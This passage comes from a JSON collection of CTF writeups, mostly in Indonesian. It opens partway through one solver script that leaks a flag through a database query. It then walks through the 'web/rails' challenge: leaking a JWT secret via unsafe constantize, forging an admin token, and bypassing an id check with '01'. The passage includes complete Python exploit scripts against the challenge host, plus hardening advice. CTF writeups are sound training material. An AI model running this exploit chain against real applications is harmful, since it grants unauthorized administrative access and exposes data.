json={\"pipeline\": json.dumps(pipeline)},\r\n        timeout=30,\r\n    )\r\n    resp.raise_for_status()\r\n    data = resp.json()\r\n    if not isinstance(data, list) or not data:\r\n        raise RuntimeError(f\"Unexpected query response: {data}\")\r\n    leaked_obj = data[0].get(\"_id\", {})\r\n    if not isinstance(leaked_obj, dict) or not leaked_obj:\r\n        raise RuntimeError(f\"Leak failed, _id not object: {data[0]}\")\r\n\r\n    # Key contains flag repeated many times.\r\n    leaked_key = next(iter(leaked_obj.keys()))\r\n    return leaked_key\r\n\r\n\r\ndef extract_flag(text: str):\r\n    m = re.search(r\"squ1rrel\\{[^}]+\\}\", text)\r\n    if not m:\r\n        raise RuntimeError(\"Flag pattern not found in leaked content\")\r\n    return m.group(0)\r\n\r\n\r\ndef main():\r\n    token = connect_session()\r\n    leaked_text = query_leak(token)\r\n    flag = extract_flag(leaked_text)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        main()\r\n    except Exception as exc:\r\n        print(f\"[!] {exc}\", file=sys.stderr)\r\n        sys.exit(1)"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{3rli4nh0tu4h_zin4li?}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-web-rails-rails-ctf-dist",
    "title": "- web/rails",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Squ 1rrel",
    "tags": [],
    "description": "Writeup for challenge - web/rails",
    "problemDescription": "Challenge ini punya dua bug yang kalau digabung jadi full chain:\n1. **Unsafe constantize** di endpoint `/show/:resource`.\n2. **Auth JWT lemah** di middleware admin (cukup valid signature, tanpa validasi claim).\n\nTerus ada bug kecil lagi di controller admin:\n- Filter blokir `id == \"1\"` bisa dibypass pakai input seperti `01`, tapi query DB tetap resolve ke row `id=1`.\n\nKombinasi tiga hal itu langsung ngasih flag.",
    "tools": [],
    "analysis": "Endpoint yang hidup dan menarik:\n- `GET /up` -> health check.\n- `GET /admin` -> `401 Missing Admin Authentication Cookie`.\n- `GET /show/:resource` -> endpoint dinamis.\n\nDari source challenge:\n- `ShowController#index` membentuk nama class dari user input:\n  - `resource_name = @resource + \"Module\"`\n  - `resource_name.constantize.new.show`\n- Ada class `JWTModule < JWTSecret`.\n- `JWTSecret#show` return secret JWT (ENV `JWT_SECRET` atau random saat boot).\n\nArtinya `/show/JWT` akan memanggil `JWTModule#show` yang mewarisi method dari `JWTSecret` dan membocorkan signing key.",
    "solution": [
      {
        "title": "1) Secret Disclosure via constantize",
        "content": "`/show/JWT` mengembalikan secret signing JWT aplikasi."
      },
      {
        "title": "2) Weak JWT Validation di `/admin`",
        "content": "Middleware `AdminAuth` hanya melakukan:\n- Ambil cookie `auth`\n- `JWT.decode(token, hmac_secret, true, { algorithm: 'HS256' })`\n\nTidak ada cek role/admin claim sama sekali. Jadi asal token ditandatangani dengan secret yang benar, request dianggap lolos."
      },
      {
        "title": "3) ID Guard Bypass",
        "content": "Di `Admin::PostsController#index`:\n- Jika `id == \"1\"` -> raise error.\n- Lalu query: `Post.where(id: params[:id]).first`\n\nInput `01` tidak sama dengan string literal `\"1\"`, jadi guard tidak aktif. Tapi DB tetap menafsirkan nilai itu sebagai id 1, sehingga post terlarang tetap terbaca."
      },
      {
        "title": "Langkah Eksploitasi",
        "content": "1. Leak secret:\n   - Request `GET /show/JWT`\n2. Forge JWT HS256 dengan secret tadi:\n   - payload bebas (misal `{ \"user\": \"admin\" }`)\n3. Akses endpoint admin dengan cookie `auth=<token>`\n4. Bypass guard id:\n   - `GET /admin/posts?id=01`\n5. Ambil `data.content` -> flag."
      },
      {
        "title": "Solver",
        "content": "File solver sudah disimpan di:\n- `solver.py`\n\nCara pakai:\n\n\nOpsional target custom:",
        "code": "source /home/nata/ctf_env/bin/activate\ncd /home/nata/ctf/squ1rrel/web/rails/rails-ctf-dist\npython3 solver.py"
      },
      {
        "title": "Catatan Hardening",
        "content": "Kalau ini aplikasi beneran, perbaikannya:\n- Jangan pakai `constantize` dari input user.\n- Jangan expose class sensitif melalui endpoint generik.\n- JWT admin wajib validasi claim (`role == admin`, `exp`, `aud`, dll).\n- Hindari guard berbasis string literal untuk ID, gunakan check yang konsisten dengan tipe data."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport sys\r\nimport requests\r\nimport jwt\r\n\r\nBASE_URL = \"https://rails.squ1rrel.dev\"\r\nTIMEOUT = 10\r\n\r\n\r\ndef get_jwt_secret(base_url: str) -> str:\r\n    r = requests.get(f\"{base_url}/show/JWT\", timeout=TIMEOUT)\r\n    r.raise_for_status()\r\n    data = r.json()\r\n    secret = data.get(\"data\")\r\n    if not secret:\r\n        raise RuntimeError(\"JWT secret tidak ditemukan dari /show/JWT\")\r\n    return secret\r\n\r\n\r\ndef forge_token(secret: str) -> str:\r\n    payload = {\"user\": \"admin\"}\r\n    return jwt.encode(payload, secret, algorithm=\"HS256\")\r\n\r\n\r\ndef get_flag(base_url: str, token: str) -> str:\r\n    # Bypass guard id == \"1\" dengan varian numerik yang tetap match ke row id=1 di DB\r\n    params = {\"id\": \"01\"}\r\n    cookies = {\"auth\": token}\r\n    r = requests.get(f\"{base_url}/admin/posts\", params=params, cookies=cookies, timeout=TIMEOUT)\r\n    r.raise_for_status()\r\n\r\n    j = r.json()\r\n    content = (((j or {}).get(\"data\") or {}).get(\"content\"))\r\n    if not content:\r\n        raise RuntimeError(\"Konten post tidak ditemukan\")\r\n    return content\r\n\r\n\r\ndef main():\r\n    base = BASE_URL\r\n    if len(sys.argv) > 1:\r\n        base = sys.argv[1].rstrip(\"/\")\r\n\r\n    secret = get_jwt_secret(base)\r\n    token = forge_token(secret)\r\n    flag = get_flag(base, token)\r\n\r\n    print(\"[+] JWT Secret:\", secret)\r\n    print(\"[+] Forged Token:\", token)\r\n    print(\"[+] Flag:\", flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{rails?_in_my_ctf???}",
    "lessonsLearned": ""
  }
];
